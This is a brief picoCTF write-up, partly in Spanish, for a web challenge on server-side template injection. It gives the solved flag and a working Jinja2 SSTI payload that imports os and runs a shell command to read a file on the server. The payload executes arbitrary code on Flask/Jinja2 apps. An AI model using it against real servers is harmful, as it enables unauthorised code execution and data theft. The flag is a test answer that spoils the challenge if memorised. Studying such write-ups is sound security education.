#### Description

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53985/)!

**Solución**

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}

**Notas adicionales**

`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`

- Este comando es un ejemplo de una vulnerabilidad crítica llamada **Server-Side Template Injection (SSTI)**. Se utiliza para engañar a un servidor (que usa motores de plantillas como Jinja2 en Flask/Python) para que ejecute código directamente en el sistema operativo.


**Referencias** 

- https://onsecurity.io/article/server-side-template-injection-with-jinja2/

